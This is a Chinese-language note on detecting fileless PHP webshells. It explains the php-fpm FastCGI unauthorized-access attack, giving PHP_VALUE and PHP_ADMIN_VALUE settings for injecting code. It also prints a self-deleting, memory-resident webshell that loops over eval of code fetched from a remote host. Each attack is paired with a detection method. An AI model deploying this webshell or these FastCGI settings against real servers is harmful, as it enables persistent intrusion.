## PHP 无文件webshell检测：

### 一、通过php-fpm未授权访问漏洞攻击
- 攻击方式

当php-fpm对外开放时，通过构造Fastcgi协议（fastcgi协议是服务器中间件和后端进行数据交换的协议），通过向php-fpm发起请求执行任意文件。

php-fpm可以理解为fastcgi协议解析器，
Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给php-fpm，
php-fpm按照fastcgi协议将TCP流解析成真正的数据。

举个栗子：如果我们请求http://127.0.0.1/index.php?a=1&b=2，如果web目录是/var/www/html，那么Nginx会根据该请求生成如下key-value对：

`
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
}
`

SCRIPT_FILENAME的值指向的PHP文件将会被执行，也就是/var/www/html/index.php。

因此，如果php-fpm对外暴露时，我们通过构造fastcgi协议直接发送给pfp-fpm，将会执行"任意文件"。
值得注意的是，这个任意文件必须是目标服务器上的文件。
如果想执行任意文件的话需要借助auto_prepend_file和auto_append_file。

auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；
auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。

假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。
所以，只需要把待执行的代码放在Body中就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）

那么如何修改这两个值呢？

这又涉及到PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。
这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。
经过测试，disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中，貌似无法修改。

`
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
`

攻击demo可参考：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

- 检测方式：
通过构建fastcgi客户端向本地php-fpm发送请求，执行本地的phpinfo文件，检查返回的PHP_VALUE和PHP_ADMIN_VALUE中以上敏感字段是否被修改过。
由于可能存在多个worker，因此通过循环请求多次。

### 二、内存驻留webshell
- 攻击方式

php webshell文件执行后删除自身。此webshell在执行后会自身删除，驻留内存之中，无文件残留。其原理主要利用以下方法：

    ignore_user_abort(true); // 后台运行
这个函数的作用是指示服务器端在远程客户端关闭连接后是否继续执行下面的脚本。如设置为True，则表示如果用户停止脚本运行，仍然不影响脚本的运行
    
    set_time_limit(0); // 取消脚本运行时间的超时上限
括号里边的数字是执行时间，如果为零说明永久执行直到程序结束，如果为大于零的数字，则不管程序是否执行完成，到了设定的秒数，程序结束。

脚本也有可能被内置的脚本计时器中断。默认的超时限制为30秒。
这个值可以通过设置 php.ini 的 max_execution_time 或 Apache .conf 设置中对应的“php_value max_execution_time”参数
或者 set_time_limit() 函数来更改。

php删除自身时借助的函数为

    unlink($_SERVER['SCRIPT_FILENAME']);
unlink函数运行条件较为苛刻，该脚本要具备可执行权限、可修改文件权限时方能执行。

简单的webshell脚本：


    <?php
        chmod($_SERVER['SCRIPT_FILENAME'], 0777);
        unlink($_SERVER['SCRIPT_FILENAME']);
        ignore_user_abort(true);
        set_time_limit(0);
        echo "success";
        $remote_file = 'http://10.211.55.2/111/test.txt';
        while($code = file_get_contents($remote_file)){
        @eval($code);
        echo "xunhuan";
        sleep(5);
        };
    ?>

test.txt中的代码如下：

    file_put_contents('printTime.txt','lucifer '.time());
    
webshell执行后，删除自身，并在该目录生成 printTime.txt，每五秒一次写入一次时间戳。

- 检测方式：
通过获取php-fpm status，检查所有php进程处理请求的持续时间，以及执行文件是否存在。
